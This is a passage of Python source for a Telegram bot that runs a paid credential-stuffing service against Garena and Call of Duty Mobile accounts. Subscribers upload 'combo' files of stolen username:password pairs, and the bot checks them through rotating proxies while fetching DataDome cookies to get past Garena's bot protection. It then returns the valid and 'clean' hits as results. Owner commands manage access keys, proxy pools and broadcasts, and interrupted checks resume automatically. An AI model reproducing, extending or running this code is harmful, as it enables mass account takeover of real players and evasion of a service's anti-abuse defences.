                wiz["expiry_days"] = 0
                wiz["step"] = "AWAIT_COMBO"
                _ask_genkey_combo(token, chat_id)
            else:
                _tg_send(token, chat_id,
                    "❌ Invalid format. Examples:\n"
                    "<code>1d</code> = 1 day\n"
                    "<code>12h</code> = 12 hours\n"
                    "<code>1d12h</code> = 1 day 12 hours\n"
                    "<code>2w</code> = 2 weeks\n"
                    "<code>3mo</code> = 3 months\n"
                    "<code>0</code> or <code>never</code> = no expiry")
            return
        # Custom combo limit input
        if wiz["step"] == "AWAIT_COMBO" and text and not text.startswith("/"):
            try:
                limit = int(text.strip())
                if limit < 0: raise ValueError
                wiz["combo_limit"] = limit
                wiz["step"] = "AWAIT_REDEEMS"
                _ask_genkey_redeems(token, chat_id)
            except ValueError:
                _tg_send(token, chat_id,
                    "❌ Enter a number (e.g. <code>2500</code>) or <code>0</code> for unlimited.")
            return
        # Custom max redemptions input
        if wiz["step"] == "AWAIT_REDEEMS" and text and not text.startswith("/"):
            try:
                max_r = int(text.strip())
                if max_r < 0: raise ValueError
                wiz["max_redemptions"] = max_r
                wiz["step"] = "AWAIT_COUNT"
                _ask_genkey_count(token, chat_id)
            except ValueError:
                _tg_send(token, chat_id,
                    "❌ Enter a number (e.g. <code>25</code>) or <code>0</code> for unlimited.")
            return
        # Custom count input
        if wiz["step"] == "AWAIT_COUNT" and text and not text.startswith("/"):
            try:
                count = int(text.strip())
                if count < 1 or count > 500: raise ValueError
                _finalize_gen_key(
                    token, chat_id,
                    tier=wiz.get("tier", "vip"),
                    key_format=wiz.get("format", "alphanum"),
                    expiry_days=wiz.get("expiry_days", 30),
                    combo_limit=wiz.get("combo_limit", 1000),
                    max_redemptions=wiz.get("max_redemptions", 1),
                    count=count,
                    label=wiz.get("label", ""),
                    expiry_seconds=wiz.get("expiry_seconds", 0),
                )
            except ValueError:
                _tg_send(token, chat_id,
                    "❌ Enter a number between <code>1</code> and <code>500</code>.")
            return

    # ── /stop — shows interactive stop panel ──────────────────
    if cmd == "stop":
        _handle_stop_panel(token, chat_id, from_user)
        return

    # ── /check — live checker stats (level, country, server) ──
    if cmd == "check":
        _handle_check(token, chat_id, from_user, cmd_args)
        return

    # ── Owner-only commands ────────────────────────────────────
    if cmd == "help":
        _handle_help(token, chat_id, from_user)
        return

    if cmd == "generate_key":
        if not _is_owner(from_user):
            _tg_send(token, chat_id, "🚫 <b>Owner only command.</b>")
            return
        _handle_gen_key(token, chat_id, from_user, cmd_args)
        return

    if cmd == "upload_proxy":
        if not _is_owner(from_user):
            _tg_send(token, chat_id, "🚫 <b>Owner only command.</b>")
            return
        _proxy_accumulator.pop(chat_id, None)   # clear any old session
        _proxy_msg_ids.pop(chat_id, None)
        _bot_state[chat_id] = "AWAIT_PROXY"
        _handle_proxy_upload(token, chat_id, from_user, msg)
        return

    if cmd == "proxy_done":
        if not _is_owner(from_user):
            _tg_send(token, chat_id, "🚫 <b>Owner only command.</b>")
            return
        if chat_id in _proxy_accumulator and _proxy_accumulator[chat_id]:
            user_msg_id = msg.get("message_id")
            if user_msg_id:
                _proxy_msg_ids.setdefault(chat_id, []).append(user_msg_id)
            _flush_proxy_accumulator(token, chat_id)
            _bot_state.pop(chat_id, None)
        else:
            _tg_send(token, chat_id,
                "📭 <b>No proxy lines to save.</b>\n\n"
                "Use /upload_proxy first to paste proxy lines, then /proxy_done to save them.")
        return

    if cmd == "proxystatus":
        if not _is_owner(from_user):
            _tg_send(token, chat_id, "🚫 <b>Owner only command.</b>")
            return
        _handle_proxy_status(token, chat_id, from_user)
        return

    if cmd == "testproxy":
        if not _is_owner(from_user):
            _tg_send(token, chat_id, "🚫 <b>Owner only command.</b>")
            return
        # Run connectivity test in background to avoid blocking
        def _run_proxy_test():
            results = []
            # Test direct connection
            try:
                resp = requests.get(
                    "https://sso.garena.com/api/prelogin?app_id=10100&account=test&format=json&id=1",
                    timeout=8, allow_redirects=False
                )
                if resp.status_code == 200:
                    results.append("🌐 Direct: ✅ OK (no DataDome block)")
                elif resp.status_code == 403:
                    results.append("🌐 Direct: 🛡️ DataDome blocked (403)")
                else:
                    results.append(f"🌐 Direct: ⚠️ HTTP {resp.status_code}")
            except Exception as e:
                results.append(f"🌐 Direct: ❌ {str(e)[:50]}")
            
            # Test DataDome cookie fetch
            try:
                sess = requests.Session()
                sess.headers.update({"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"})
                dd = get_datadome_cookie(sess)
                if dd:
                    results.append(f"🍪 DataDome: ✅ Cookie obtained")
                else:
                    results.append("🍪 DataDome: ❌ Failed to get cookie")
                sess.close()
            except Exception as e:
                results.append(f"🍪 DataDome: ❌ {str(e)[:50]}")
            
            # Test a few proxies from the pool
            pool_size = geo_rotator.total
            if pool_size > 0:
                test_count = min(3, pool_size)
                working = 0
                tested = 0
                for i in range(test_count):
                    try:
                        proxy_dict = geo_rotator.get_proxies()
                        if not proxy_dict:
                            break
                        sess = requests.Session()
                        sess.proxies.update(proxy_dict)
                        sess.headers.update({"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"})
                        resp = sess.get(
                            "https://dd.garena.com/js/",
                            timeout=6, allow_redirects=False
                        )
                        if resp.status_code in (200, 403):
                            working += 1
                        tested += 1
                        sess.close()
                        geo_rotator.smart_rotate()
                    except Exception:
                        tested += 1
                        geo_rotator.smart_rotate()
                results.append(f"🔄 Proxies: {working}/{tested} working (pool: {pool_size})")
            else:
                results.append("🔄 Proxies: ⚠️ Pool is empty!")
            
            _tg_send(token, chat_id,
                f"🧪 <b>Proxy Connectivity Test</b>\n\n" +
                "\n".join(results)
            )
        
        threading.Thread(target=_run_proxy_test, daemon=True).start()
        _tg_send(token, chat_id, "🧪 <b>Running proxy test...</b> (results in ~10s)")
        return

    if cmd == "deleteproxy":
        if not _is_owner(from_user):
            _tg_send(token, chat_id, "🚫 <b>Owner only command.</b>")
            return
        _handle_delete_proxy(token, chat_id, from_user)
        return

    if cmd == "renewproxy":
        if not _is_owner(from_user):
            _tg_send(token, chat_id, "🚫 <b>Owner only command.</b>")
            return
        # Run in background thread since it makes HTTP requests
        def _run_renew_proxy():
            _handle_renew_proxy(token, chat_id, from_user)
        threading.Thread(target=_run_renew_proxy, daemon=True).start()
        return

    if cmd == "add_coowner":
        if not _is_primary_owner(from_user):
            _tg_send(token, chat_id, "🚫 <b>Primary owner only command.</b>")
            return
        args = cmd_args
        if not args:
            # Show current co-owners and instructions
            if COOWNER_IDS:
                colist = "\n".join(f"  • <code>{uid}</code>" for uid in sorted(COOWNER_IDS))
            else:
                colist = "  <i>None</i>"
            _tg_send(token, chat_id,
                f"👥 <b>Co-Owner Management</b>\n\n"
                f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                f"📋 <b>Current co-owners:</b>\n{colist}\n"
                f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                f"<b>Usage:</b>\n"
                f"<code>/add_coowner 123456789</code> — add a co-owner\n"
                f"<code>/remove_coowner 123456789</code> — remove a co-owner\n\n"
                f"<i>Co-owners have full owner access (generate keys, upload proxy, etc.)</i>")
            return
        try:
            co_uid = int(args)
        except ValueError:
            _tg_send(token, chat_id, "❌ <b>Invalid ID.</b> Use a numeric Telegram user ID.\n\nExample: <code>/add_coowner 123456789</code>")
            return
        if co_uid == OWNER_ID:
            _tg_send(token, chat_id, "⚠️ That's already the primary owner ID.")
            return
        if co_uid in COOWNER_IDS:
            _tg_send(token, chat_id, f"ℹ️ <code>{co_uid}</code> is already a co-owner.")
            return
        _add_coowner(co_uid)
        _tg_send(token, chat_id,
            f"✅ <b>Co-owner added!</b>\n\n"
            f"🆔 <code>{co_uid}</code> now has owner-level access.\n"
            f"👥 Total co-owners: <b>{len(COOWNER_IDS)}</b>")
        return

    if cmd == "remove_coowner":
        if not _is_primary_owner(from_user):
            _tg_send(token, chat_id, "🚫 <b>Primary owner only command.</b>")
            return
        args = cmd_args
        if not args:
            if COOWNER_IDS:
                colist = "\n".join(f"  • <code>{uid}</code>" for uid in sorted(COOWNER_IDS))
            else:
                colist = "  <i>None</i>"
            _tg_send(token, chat_id,
                f"👥 <b>Remove Co-Owner</b>\n\n"
                f"📋 <b>Current co-owners:</b>\n{colist}\n\n"
                f"<b>Usage:</b> <code>/remove_coowner 123456789</code>")
            return
        try:
            co_uid = int(args)
        except ValueError:
            _tg_send(token, chat_id, "❌ <b>Invalid ID.</b> Use a numeric Telegram user ID.")
            return
        if co_uid not in COOWNER_IDS:
            _tg_send(token, chat_id, f"ℹ️ <code>{co_uid}</code> is not a co-owner.")
            return
        _remove_coowner(co_uid)
        _tg_send(token, chat_id,
            f"✅ <b>Co-owner removed!</b>\n\n"
            f"🆔 <code>{co_uid}</code> no longer has owner access.\n"
            f"👥 Remaining co-owners: <b>{len(COOWNER_IDS)}</b>")
        return

    if cmd == "serverstatus":
        if not _is_owner(from_user):
            _tg_send(token, chat_id, "🚫 <b>Owner only command.</b>")
            return
        _handle_server_status(token, chat_id, from_user)
        return

    if cmd == "setthreads":
        _handle_set_threads(token, chat_id, from_user, cmd_args)
        return

    if cmd == "setmaxusers":
        _handle_set_max_users(token, chat_id, from_user, cmd_args)
        return

    if cmd == "resetconfig":
        if not _is_owner(from_user):
            _tg_send(token, chat_id, "🚫 <b>Owner only command.</b>")
            return
        # Delete config.json so next restart triggers the wizard again
        if os.path.exists(CONFIG_FILE):
            os.remove(CONFIG_FILE)
        # Also clear KeyVault config state (Railway persistence)
        try:
            if api and api.enabled:
                api.delete_state("bot_config")
        except Exception:
            pass
        _tg_send(token, chat_id,
            "🗑 <b>Config deleted!</b>\n\n"
            "On local: restart the bot \u2014 it will ask for your token and owner ID again.\n"
            "On Railway: set BOT_TOKEN and OWNER_ID env vars, then redeploy.")
        return
    if cmd == "stopall":
        if not _is_owner(from_user):
            _tg_send(token, chat_id, "🚫 <b>Owner only command.</b>")
            return
        stopped_count = 0
        for target_id, evt in list(_stop_events.items()):
            if not evt.is_set():
                evt.set()
                stopped_count += 1
        if stopped_count:
            _tg_send(token, chat_id,
                f"☢️ <b>Stop ALL sent!</b>\n\n"
                f"Sent stop signal to <b>{stopped_count}</b> running checker(s).")
        else:
            _tg_send(token, chat_id, "ℹ️ No checkers are currently running.")
        return

    # ── /broadcast ── owner sends a message to all users (with Done button) ──
    if cmd == "broadcast":
        if not _is_owner(from_user):
            _tg_send(token, chat_id, "🚫 <b>Owner only command.</b>")
            return
        _broadcast_accumulator.pop(chat_id, None)   # clear any old session
        _bot_state[chat_id] = "AWAIT_BROADCAST"
        _tg_send_buttons(token, chat_id,
            "📢 <b>Broadcast Mode</b>\n\n"
            "Type your message below. You can send multiple messages.\n"
            "When done, tap <b>✅ Done</b> to send to all users.\n\n"
            "<i>Your next message will start the broadcast text.</i>",
            [
                [
                    {"text": "✅ Done (send broadcast)", "callback_data": "broadcast:done"},
                    {"text": "🗑 Cancel", "callback_data": "broadcast:cancel"},
                ],
            ])
        return

    if cmd == "statuskey":
        if not _is_owner(from_user):
            _tg_send(token, chat_id, "🚫 <b>Owner only command.</b>")
            return
        _handle_status_key(token, chat_id, from_user, cmd_args)
        return

    if cmd == "deletekey":
        if not _is_owner(from_user):
            _tg_send(token, chat_id, "🚫 <b>Owner only command.</b>")
            return
        _handle_delete_key(token, chat_id, from_user, cmd_args)
        return

    if cmd == "keysystem":
        if not _is_owner(from_user):
            _tg_send(token, chat_id, "🚫 <b>Owner only command.</b>")
            return
        _handle_keysystem_config(token, chat_id, from_user, cmd_args)
        return

    # ── Proxy file upload state ────────────────────────────────
    if _bot_state.get(chat_id) == "AWAIT_PROXY":
        if msg.get("document"):
            # File upload — process immediately and exit proxy mode
            _proxy_msg_ids.pop(chat_id, None)   # clear tracker, not a pasted session
            _handle_proxy_upload(token, chat_id, from_user, msg)
            _bot_state.pop(chat_id, None)
        elif cmd in ("done", "proxy_done") or text.lower() == "done":
            # Flush accumulated lines — will auto-delete tracked messages
            user_msg_id = msg.get("message_id")
            if user_msg_id:
                _proxy_msg_ids.setdefault(chat_id, []).append(user_msg_id)
            _flush_proxy_accumulator(token, chat_id)
            _bot_state.pop(chat_id, None)
        elif text and not text.startswith("/"):
            # More proxy lines — accumulate, stay in AWAIT_PROXY
            _handle_proxy_upload(token, chat_id, from_user, msg)
            # NOTE: do NOT pop state — owner may send more batches
        else:
            bot_reply = _tg_send_buttons(token, chat_id,
                "📡 Keep sending proxy lines, or tap Done when finished.",
                [
                    [
                        {"text": "✅ Done (save all)", "callback_data": "proxy:done"},
                        {"text": "🗑 Clear & Cancel",  "callback_data": "proxy:cancel"},
                    ],
                ]
            )
            if bot_reply and bot_reply.get("ok"):
                _proxy_msg_ids.setdefault(chat_id, []).append(
                    bot_reply["result"]["message_id"])
        return

    # ── Broadcast message accumulation ──────────────────────────────────────
    if _bot_state.get(chat_id) == "AWAIT_BROADCAST":
        if not _is_owner(from_user):
            _bot_state.pop(chat_id, None)
            _broadcast_accumulator.pop(chat_id, None)
            return
        if cmd in ("done", "broadcast_done") or text.lower() == "done":
            _flush_broadcast_accumulator(token, chat_id, from_user)
        elif text and not text.startswith("/"):
            if chat_id not in _broadcast_accumulator:
                _broadcast_accumulator[chat_id] = []
            _broadcast_accumulator[chat_id].append(text)
            count_lines = len(_broadcast_accumulator[chat_id])
            _tg_send_buttons(token, chat_id,
                f"📝 <b>Message received!</b> Lines so far: <code>{count_lines}</code>\n"
                f"<i>Keep typing more, or tap Done to send to all users.</i>",
                [
                    [
                        {"text": "✅ Done (send broadcast)", "callback_data": "broadcast:done"},
                        {"text": "🗑 Cancel", "callback_data": "broadcast:cancel"},
                    ],
                ])
        else:
            _tg_send_buttons(token, chat_id,
                "📢 <b>Broadcast Mode</b>\n\nType your message, or tap Done/Cancel:",
                [
                    [
                        {"text": "✅ Done (send broadcast)", "callback_data": "broadcast:done"},
                        {"text": "🗑 Cancel", "callback_data": "broadcast:cancel"},
                    ],
                ])
        return

    # ── /start — always allowed, no key required ─────────────
    # CRITICAL: /start must never be blocked — it is how new users
    # arrive and how they reach /redeem to get a key.
    if cmd == "start":
        _handle_start(token, chat_id, from_user)
        return

    # ── /reset — always allowed (lets users clear broken state) ─
    if cmd == "reset":
        key_id = str(from_user.get("id", chat_id))
        uname  = from_user.get("username", "")
        # ── Preserve key & expiry before clearing ────────────────────
        old_d       = _user_data.get(chat_id, {})
        saved_key   = old_d.get("key") or (_saved_users.get(key_id) or {}).get("key")
        saved_exp   = old_d.get("key_expires") or (_saved_users.get(key_id) or {}).get("key_expires", 0)
        # Clear settings but keep key access
        _saved_users.pop(key_id, None)
        if uname:
            _saved_users.pop(uname.lstrip("@").lower(), None)
        _save_users_to_disk()
        _user_data.pop(chat_id, None)
        _bot_state.pop(chat_id, None)
        # Restore key so user doesn't need to re-redeem
        if saved_key and saved_exp and time.time() < saved_exp:
            d = _udata(chat_id)
            d["key"]         = saved_key
            d["key_expires"] = saved_exp
            # Note: intentionally NOT calling _save_profile here,
            # so /start will go through level/filter picker again.
            # _check_access will find the key in _udata.
        _tg_send(token, chat_id,
            "🗑 <b>Settings cleared!</b>\n\n"
            "Send /start to choose your level and hit type again.")
        return

    # ── /redeem — always allowed (users need this to get access) ─
    if cmd == "redeem":
        _handle_redeem(token, chat_id, from_user, cmd_args)
        return

    # ── Waiting for user to type their key (no access needed) ──
    if _bot_state.get(chat_id) == "AWAIT_REDEEM_KEY":
        if text and not text.startswith("/"):
            _bot_state.pop(chat_id, None)
            _handle_redeem(token, chat_id, from_user, text.strip())
        elif cmd == "redeem":
            _bot_state.pop(chat_id, None)
            _handle_redeem(token, chat_id, from_user, cmd_args)
        else:
            _tg_send(token, chat_id,
                "🔑 Just type your key and send it, or use:\n"
                "<code>/redeem YOUR_KEY</code>")
        return

    # ── Access gate for all other interactions ─────────────────
    if not _check_access(token, chat_id, from_user):
        return

    # ── Auto-restore saved profile if state was lost (e.g. bot restart) ──
    if chat_id not in _bot_state:
        tg_id  = from_user.get("id", chat_id)
        uname  = from_user.get("username", "")
        saved  = _get_saved_profile(str(tg_id)) or (
            _get_saved_profile(uname.lower()) if uname else None
        )
        if saved:
            d = _udata(chat_id)
            d["hits_id"]      = saved["hits_id"]
            d["username"]     = saved.get("username", uname)
            d["level"]        = saved["level"]
            d["clean_filter"] = saved["clean_filter"]
            d["key"]          = saved.get("key")
            d["key_expires"]  = saved.get("key_expires", 0)
            d["combo_limit"]  = saved.get("combo_limit", COMBO_LINE_LIMIT)
            d["key_tier"]     = saved.get("key_tier", "free")
            _bot_state[chat_id] = "AWAIT_FILE"
        else:
            _bot_state[chat_id] = "AWAIT_LEVEL"

    state = _bot_state.get(chat_id, "AWAIT_LEVEL")

    if state == "AWAIT_LEVEL":
        if text:
            _handle_level(token, chat_id, text)
        else:
            _ask_level(token, chat_id)
        return

    if state == "AWAIT_FILTER":
        if text:
            _handle_filter(token, chat_id, text)
        else:
            d = _udata(chat_id)
            lvl_label = "ALL levels" if d.get("level") == [1] else f"Level {d.get('level', [1])[0]}+"
            _ask_filter(token, chat_id, lvl_label)
        return

    if state == "RUNNING":
        _tg_send(token, chat_id,
            "⏳ <b>Checker is still running.</b>\n"
            "Send /stop to cancel, or wait for it to finish.")
        return

    if state == "AWAIT_FILE":
        if msg.get("document"):
            _handle_file(token, chat_id, msg, from_user)
        else:
            _tg_send(token, chat_id,
                "📂 Please upload your combo file.\n"
                "<i>Name must contain 'garena' or 'codm'</i>\n"
                "(e.g. <code>garena.txt</code>, <code>codm.txt</code>, <code>Yuki_garena.txt</code>)\n"
                "Or send /start to reset settings.")


# ── Auto-resume interrupted sessions on startup ───────────────
def _auto_resume_sessions(token: str):
    """Check for interrupted sessions from a crash/restart and resume them.
    Uses persistent combo files from saved_combos/ directory."""
    sessions = _load_active_sessions()
    if not sessions:
        return

    logger.info(f"[BOT] 🔄 Found {len(sessions)} interrupted session(s) — attempting auto-resume...")

    for key, sess in sessions.items():
        chat_id    = sess.get("chat_id")
        file_path  = sess.get("file_path", "")
        persistent_path = sess.get("persistent_path", "")
        file_name  = sess.get("file_name", "unknown.txt")
        progress   = sess.get("progress", 0)
        total      = sess.get("total_lines", 0)

        if not chat_id:
            continue

        # Try persistent path first, then original path, then default saved_combos path
        combo_path = None
        for candidate in [persistent_path, file_path,
                          os.path.join(SAVED_COMBOS_DIR, f"{chat_id}_{file_name}")]:
            if candidate and os.path.exists(candidate):
                combo_path = candidate
                break

        if not combo_path:
            logger.warning(f"[BOT] Resume skip: file gone for chat {chat_id}")
            _tg_send(token, chat_id,
                f"⚠️ <b>Bot restarted!</b>\n\n"
                f"Your previous check (<code>{file_name}</code>) could not resume — "
                f"the file was lost during restart.\n\n"
                f"📂 Please re-upload your combo file to continue.")
            _remove_active_session(chat_id)
            continue

        # Read remaining lines from the combo file
        all_lines = []
        for enc in ["utf-8", "latin-1", "cp1252", "iso-8859-1"]:
            try:
                with open(combo_path, "r", encoding=enc, errors="ignore") as fh:
                    all_lines = [l.strip() for l in fh if l.strip() and ":" in l]
                break
            except Exception:
                continue

        if not all_lines:
            _tg_send(token, chat_id,
                f"⚠️ <b>Bot restarted!</b>\n\n"
                f"Could not resume <code>{file_name}</code> — file is empty or unreadable.\n\n"
                f"📂 Please re-upload your combo file.")
            _remove_active_session(chat_id)
            continue

        # Skip already-processed lines
        remaining_lines = all_lines[progress:]
        if not remaining_lines:
            _tg_send(token, chat_id,
                f"✅ <b>Bot restarted!</b>\n\n"
                f"Your previous check (<code>{file_name}</code>) was already complete ({progress}/{total}).\n\n"
                f"📂 Send a new combo file to start again.")
            _remove_active_session(chat_id)
            continue

        # Restore user data
        d = _udata(chat_id)
        d["hits_id"]      = sess.get("hits_id", chat_id)
        d["username"]     = sess.get("username", "")
        d["level"]        = sess.get("level", [1])
        d["clean_filter"] = sess.get("clean_filter", "both")
        d["combo_limit"]  = sess.get("combo_limit", COMBO_LINE_LIMIT)

        # Write remaining lines to a temp file for the checker
        save_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), "combo")
        os.makedirs(save_dir, exist_ok=True)
        resume_path = os.path.join(save_dir, f"resume_{chat_id}_{file_name}")
        with open(resume_path, "w", encoding="utf-8") as fh:
            fh.write("\n".join(remaining_lines) + "\n")

        # Notify user
        _tg_send(token, chat_id,
            f"🔄 <b>Auto-Resuming!</b>\n\n"
            f"Bot restarted — resuming your check automatically.\n\n"
            f"📄 <b>File:</b> <code>{file_name}</code>\n"
            f"📊 <b>Progress:</b> {progress}/{total} done\n"
            f"▶️ <b>Remaining:</b> {len(remaining_lines)} accounts\n\n"
            f"<i>Resuming now... Send /stop to cancel.</i>")

        # Start checker thread for remaining lines
        hits_id = d["hits_id"]
        user_telegram_config = (token, str(hits_id), d["level"], "", d["clean_filter"])

        with _state_lock:
            _bot_state[chat_id] = "RUNNING"

        # Update session with new file path (also re-saves to persistent dir)
        _save_active_session(chat_id, resume_path, file_name, remaining_lines, d, 0)

        stop_evt = threading.Event()
        with _stop_events_lock:
            _stop_events[chat_id] = stop_evt

        def _resume_run(cid=chat_id, rpath=resume_path, tg_cfg=user_telegram_config,
                        se=stop_evt, fn=file_name, rem=len(remaining_lines)):
            try:
                label = f"resume:{cid}"
                stats, result_folder = _run_checker_for_file(
                    rpath, tg_cfg, chat_id=cid, label=label, stop_event=se
                )
                stopped = se.is_set()
            except Exception as e:
                stats = {}
                result_folder = ""
                stopped = False
                logger.error(f"[BOT] Resume checker error: {e}", exc_info=True)
            finally:
                with _state_lock:
                    _bot_state[cid] = "AWAIT_FILE"
                with _stop_events_lock:
                    _stop_events.pop(cid, None)
                _remove_active_session(cid)

                if stopped:
                    _tg_send(token, cid,
                        f"🛑 <b>Resumed checker stopped.</b>\n"
                        f"📊 Partial results for <code>{fn}</code>")
                else:
                    valid = stats.get("valid", 0)
                    invalid = stats.get("invalid", 0)
                    clean_c = stats.get("clean", 0)
                    _tg_send(token, cid,
                        f"✅ <b>Resumed Check Complete!</b>\n\n"
                        f"📄 <code>{fn}</code>\n"
                        f"✅ Valid: <code>{valid}</code>  ❌ Invalid: <code>{invalid}</code>  "
                        f"🧹 Clean: <code>{clean_c}</code>")

                if result_folder and os.path.isdir(result_folder):
                    _send_results_zip(token, cid, result_folder, fn)

                # Cleanup temp file (not persistent copy)
                try:
                    if os.path.exists(rpath):
                        os.remove(rpath)
                except Exception:
                    pass

                gc.collect()
                _tg_send(token, cid,
                    f"📂 Send your next combo file to check again.\n"
                    f"Or /start to reset your settings.")

        threading.Thread(target=_resume_run, daemon=True).start()
        logger.info(f"[BOT] 🔄 Resumed session for chat_id={chat_id}, {len(remaining_lines)} remaining")


# ── long-poll loop (single daemon thread, handles all users) ───
def start_bot_polling(token: str, _unused=None):
    offset = 0
    consecutive_errors = 0
    _update_executor = ThreadPoolExecutor(max_workers=8, thread_name_prefix="BotUpdate")

    def _create_poll_session():
        """Create a fresh polling session with keep-alive."""
        s = requests.Session()
        s.mount("https://", requests.adapters.HTTPAdapter(
            pool_connections=2, pool_maxsize=4, max_retries=1
        ))
        return s

    poll_session = _create_poll_session()

    def _safe_handle(upd):
        """Process a single update in the thread pool — never blocks polling."""
        try:
            handle_bot_update(token, upd, None)
        except Exception as e:
            logger.error(f"[BOT] Update error: {e}", exc_info=True)

    def _poll():
        nonlocal offset, poll_session, consecutive_errors
        logger.info("[BOT] 🤖 Polling started — waiting for users...")
        _touch_liveness()  # polling started
        # Sync user profiles and keys from KeyVault API (survives Railway redeploys)
        try:
            _load_saved_users(sync_api=True)
            logger.info("[BOT] ✅ User profiles synced from API")
        except Exception as e:
            logger.warning(f"[BOT] API user sync skipped: {e}")
        # Auto-resume any interrupted sessions from previous crash
        try:
            _auto_resume_sessions(token)
        except Exception as e:
            logger.error(f"[BOT] Auto-resume failed: {e}", exc_info=True)
        while not shutdown_event.is_set():
            try:
                r = poll_session.get(
                    f"https://api.telegram.org/bot{token}/getUpdates",
                    params={"timeout": 30, "offset": offset},
                    timeout=35
                )
                consecutive_errors = 0  # reset on success
                _touch_liveness()  # polling is alive

                if r.status_code == 429:
                    retry_after = int(r.headers.get("Retry-After", 10))
                    logger.warning(f"[BOT] Polling rate-limited — sleeping {retry_after}s")
                    time.sleep(retry_after)
                    continue
                if r.status_code == 409:
                    logger.warning("[BOT] Conflict (409) — another bot instance running? Retrying in 3s")
                    time.sleep(3)
                    continue
                if r.status_code != 200:
                    logger.warning(f"[BOT] getUpdates HTTP {r.status_code} — retrying in 5s")
                    time.sleep(5)
                    continue
                try:
                    payload = r.json()
                except ValueError:
                    logger.warning("[BOT] getUpdates returned non-JSON response — retrying in 5s")
                    time.sleep(5)
                    continue
                for upd in payload.get("result", []):
                    offset = upd["update_id"] + 1
                    _update_executor.submit(_safe_handle, upd)
            except requests.exceptions.Timeout:
                # Long-poll timeout is normal — just loop again immediately
                continue
            except (requests.exceptions.ConnectionError,
                    requests.exceptions.ChunkedEncodingError,
                    ConnectionResetError, OSError) as e:
                consecutive_errors += 1
                wait = min(5 * consecutive_errors, 30)
                logger.warning(f"[BOT] Connection error #{consecutive_errors}: {e} — retrying in {wait}s")
                time.sleep(wait)
                # Recreate session after 3 consecutive connection errors
                if consecutive_errors >= 3:
                    try:
                        poll_session.close()
                    except Exception:
                        pass
                    poll_session = _create_poll_session()
                    logger.info("[BOT] 🔄 Recreated polling session after repeated errors")
                    consecutive_errors = 0
            except Exception as e:
                consecutive_errors += 1
                logger.warning(f"[BOT] Poll error: {e}")
                time.sleep(5)

    threading.Thread(target=_poll, daemon=True).start()


# ═══════════════════════════════════════════════════════════════════
#  RAILWAY HEALTHCHECK SERVER — lightweight HTTP server for liveness
#  Railway pings /health every 30s; if it fails 3 times → auto-restart
# ═══════════════════════════════════════════════════════════════════
_healthcheck_server = None  # reference to HTTPServer for cleanup

def _start_healthcheck_server():
    """Start a lightweight HTTP server for Railway healthchecks.
    Responds 200 if bot is alive, 503 if the main loop appears stuck."""
    from http.server import HTTPServer, BaseHTTPRequestHandler
    import traceback

    port = int(os.environ.get("PORT", 0))  # Railway sets PORT automatically

    if not port:
        logger.debug("[HEALTH] No PORT env var — healthcheck server disabled")
        return

    class HealthHandler(BaseHTTPRequestHandler):
        def do_GET(self):
            if self.path == "/health":
                age = _get_liveness_age()
                # If no liveness touch in 5 minutes → 503 (unhealthy)
                if age > 300:
                    self.send_response(503)
                    self.send_header("Content-Type", "application/json")
                    self.end_headers()
                    self.wfile.write(json.dumps({
                        "status": "unhealthy",
                        "reason": f"no activity for {int(age)}s",
                    }).encode())
                    logger.warning(f"[HEALTH] ❌ Healthcheck FAILED — no activity for {int(age)}s")
                else:
                    self.send_response(200)
                    self.send_header("Content-Type", "application/json")
                    self.end_headers()
                    active = sum(1 for s in _bot_state.values() if s == "RUNNING")
                    self.wfile.write(json.dumps({
                        "status": "healthy",
                        "active_checkers": active,
                        "liveness_age_s": int(age),
                        "proxies": geo_rotator.total if hasattr(geo_rotator, "total") else 0,
                    }).encode())
            else:
                self.send_response(404)
                self.end_headers()

        def log_message(self, format, *args):
            # Suppress default request logging to keep terminal clean
            pass

    try:
        server = HTTPServer(("0.0.0.0", port), HealthHandler)
        global _healthcheck_server
        _healthcheck_server = server
        threading.Thread(target=server.serve_forever, daemon=True, name="HealthcheckServer").start()
        logger.info(f"[HEALTH] ✅ Healthcheck server listening on :{port}/health")
    except Exception as e:
        logger.warning(f"[HEALTH] Could not start healthcheck server: {e}")


def _railway_redeploy():
    """Trigger a Railway redeploy via the API using RAILWAY_TOKEN.
    Falls back to os.execv (full process restart) if API is unavailable."""
    token = os.environ.get("RAILWAY_TOKEN", "").strip()
    service_id = os.environ.get("RAILWAY_SERVICE_ID", "").strip()
    environment_id = os.environ.get("RAILWAY_ENVIRONMENT_ID", "").strip()

    if token and service_id:
        try:
            logger.info("[RAILWAY] 🔄 Triggering redeploy via Railway API...")
            # Notify owner before redeploying
            try:
                _tg_send(BOT_TOKEN, OWNER_ID,
                    "🔄 <b>Auto-Redeploy Triggered</b>\n\n"
                    "Bot detected a critical failure and is redeploying itself.\n"
                    "<i>You don't need to do anything — it will be back online shortly.</i>"
                )
            except Exception:
                pass

            # Use Railway's GraphQL API to trigger a redeploy
            headers = {
                "Authorization": f"Bearer {token}",
                "Content-Type": "application/json",
            }
            # First get the latest deployment ID
            query = """
            mutation { deployTrigger(serviceId: "%s", environmentId: "%s") { id } }
            """ % (service_id, environment_id)
            resp = requests.post(
                "https://backboard.railway.app/graphql/v2",
                json={"query": query},
                headers=headers,
                timeout=10,
            )
            if resp.ok:
                logger.info("[RAILWAY] ✅ Redeploy triggered successfully via API")
                # Give the message time to send, then exit so Railway can redeploy
                time.sleep(3)
                os._exit(1)  # non-zero exit so Railway knows this instance is done
            else:
                logger.warning(f"[RAILWAY] API redeploy failed ({resp.status_code}), falling back to execv")
        except Exception as e:
            logger.warning(f"[RAILWAY] API redeploy error: {e}, falling back to execv")

    # Fallback: full process restart via os.execv
    # This is the nuclear option — re-exec the Python process from scratch
    logger.info("[RAILWAY] 🔄 Restarting process via os.execv...")
    try:
        _tg_send(BOT_TOKEN, OWNER_ID,
            "🔄 <b>Auto-Restart Triggered</b>\n\n"
            "Bot is restarting itself after detecting a critical failure.\n"
            "<i>It will be back online in a moment.</i>"
        )
        time.sleep(3)  # give Telegram message time to send
    except Exception:
        pass
    os.execv(sys.executable, [sys.executable] + sys.argv)



def main():
    global BOT_MODE
    print_banner()

    # ── Railway-safe signal handling (SIGTERM for graceful shutdown) ──
    def _graceful_shutdown(signum, frame):
        logger.warning(f"[MAIN] Received signal {signum} — shutting down gracefully...")
        shutdown_event.set()
        # Set all user stop events so running checkers stop
        with _stop_events_lock:
